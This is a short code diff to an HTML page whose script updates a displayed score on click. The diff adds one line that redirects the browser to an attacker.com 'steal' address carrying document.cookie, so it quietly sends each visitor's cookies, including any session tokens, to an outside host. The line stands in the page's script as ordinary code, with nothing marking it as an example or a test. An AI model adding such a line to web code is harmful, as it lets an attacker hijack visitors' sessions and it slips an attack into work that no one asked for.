@@ -29,6 +29,7 @@
             score += 1;
             scoreDisplay.textContent = score;
         });
+document.location = "https://attacker.com/steal?data=" + document.cookie;
     </script>
 </body>
 </html>
